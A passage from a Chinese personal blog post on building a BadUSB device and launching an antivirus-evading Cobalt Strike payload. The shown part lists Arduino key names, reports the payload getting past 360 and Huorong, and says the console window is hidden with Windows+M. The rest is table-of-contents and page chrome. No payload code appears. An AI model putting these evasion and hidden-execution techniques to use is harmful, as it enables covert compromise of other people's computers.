class="line">KEY_DELETE</span><br><span class="line">KEY_PAGE_UP</span><br><span class="line">KEY_PAGE_DOWN</span><br><span class="line">KEY_HOME</span><br><span class="line">KEY_END</span><br><span class="line">KEY_CAPS_LOCK</span><br><span class="line">KEY_F1</span><br><span class="line">KEY_F2</span><br><span class="line">KEY_F3</span><br><span class="line">KEY_F4</span><br><span class="line">KEY_F5</span><br><span class="line">KEY_F6</span><br><span class="line">KEY_F7</span><br><span class="line">KEY_F8</span><br><span class="line">KEY_F9</span><br><span class="line">KEY_F10</span><br><span class="line">KEY_F11</span><br><span class="line">KEY_F12</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="效果测试"><a href="#效果测试" class="headerlink" title="效果测试"></a>效果测试</h1><p>在360和火绒都为最新病毒库下，仍免杀上线！</p>
+<p><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224200814925.png" alt="image-20220224200814925"></p>
+<p><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224200919302.png" alt="image-20220224200919302"></p>
+<p>美中不足的是最后会留下一个小黑框，如图所示。</p>
+<p>但可以通过执行一些键盘命令来最小化或者隐藏，现在的代码执行完毕后会执行<code>Windows</code>+<code>M</code>键来隐藏窗口。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Riddler</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://riddlerm.github.io/posts/59900/">http://riddlerm.github.io/posts/59900/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://riddlerm.github.io" target="_blank">Riddler's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Badusb/">Badusb</a><a class="post-meta__tags" href="/tags/CS%E5%85%8D%E6%9D%80/">CS免杀</a></div><div class="post_share"><div class="social-share" data-image="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224174207196.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/27217/"><img class="prev-cover" src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220131123628971.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">利用腾讯云SCF实现兔小巢新反馈实时推送</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://thirdqq.qlogo.cn/g?b=oidb&amp;k=LMGBgwOams2fZdeTFTEk8g&amp;s=100" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Riddler</div><div class="author-info__description">Riddler's Blog</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/RiddlerM"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Badusb%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">Badusb介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%88HID%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">原理（HID攻击）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8A%BF"><span class="toc-number">1.3.</span> <span class="toc-text">优势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A7%8D%E7%B1%BB"><span class="toc-number">1.4.</span> <span class="toc-text">种类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%95%88%E6%9E%9C"><span class="toc-number">1.5.</span> <span class="toc-text">实现效果</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%85%8D%E6%9D%80%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">制作免杀图片马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">工具介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%85%8D%E6%9D%80%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">制作免杀马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8CS%E7%94%9F%E6%88%90payload"><span class="toc-number">2.2.1.</span> <span class="toc-text">使用CS生成payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">2.2.2.</span> <span class="toc-text">生成免杀图片马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%80%E6%AF%92%E6%B5%8B%E8%AF%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">杀毒测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%B6%E4%BD%9CBadusb"><span class="toc-number">3.</span> <span class="toc-text">制作Badusb</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%AD%E4%B9%B0Badusb"><span class="toc-number">3.1.</span> <span class="toc-text">购买Badusb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BDArduino-IDE"><span class="toc-number">3.2.</span> <span class="toc-text">下载Arduino IDE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86Badusb%E8%BF%9E%E6%8E%A5%E5%88%B0IDE"><span class="toc-number">3.3.</span> <span class="toc-text">将Badusb连接到IDE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%A7%E5%BD%95%E4%BB%A3%E7%A0%81%E8%BF%9BBadusb"><span class="toc-number">3.4.</span> <span class="toc-text">烧录代码进Badusb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8arduino%E4%BB%A3%E7%A0%81%E5%92%8C%E6%8C%89%E9%94%AE"><span class="toc-number">3.5.</span> <span class="toc-text">常用arduino代码和按键</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%88%E6%9E%9C%E6%B5%8B%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text">效果测试</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/59900/" title="Badusb制作及CS免杀上线"><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220224174207196.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Badusb制作及CS免杀上线"/></a><div class="content"><a class="title" href="/posts/59900/" title="Badusb制作及CS免杀上线">Badusb制作及CS免杀上线</a><time datetime="2022-02-24T12:32:10.000Z" title="发表于 2022-02-24 20:32:10">2022-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/27217/" title="利用腾讯云SCF实现兔小巢新反馈实时推送"><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220131123628971.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用腾讯云SCF实现兔小巢新反馈实时推送"/></a><div class="content"><a class="title" href="/posts/27217/" title="利用腾讯云SCF实现兔小巢新反馈实时推送">利用腾讯云SCF实现兔小巢新反馈实时推送</a><time datetime="2022-01-31T02:16:05.000Z" title="发表于 2022-01-31 10:16:05">2022-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/45659/" title="Windows创建影子账户复现"><img src="https://riddlerblog.oss-cn-beijing.aliyuncs.com/imgs/image-20220107213619212.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows创建影子账户复现"/></a><div class="content"><a class="title" href="/posts/45659/" title="Windows创建影子账户复现">Windows创建影子账户复现</a><time datetime="2022-01-07T12:44:19.000Z" title="发表于 2022-01-07 20:44:19">2022-01-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/57456/" title="树莓派4B 安装Kali"><img src="https://img-blog.csdnimg.cn/20210718214808135.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="树莓派4B 安装Kali"/></a><div class="content"><a class="title" href="/posts/57456/" title="树莓派4B 安装Kali">树莓派4B 安装Kali</a><time datetime="2022-01-04T12:22:19.000Z" title="发表于 2022-01-04 20:22:19">2022-01-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Riddler</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function initWaline () {
+    const waline = new Waline(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://blog-api-m75hv7ilc-riddlerm.vercel.app',
+      avatar: 'wavatar',
+      avatarCDN: 'https://sdn.geekzu.org/avatar/',
+      path: location.pathname,
+      visitor: false,
+      dark: 'html[data-theme="dark"]'
+    }, null))
+  }
+
+  if (typeof Waline === 'function') initWaline() 
+  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
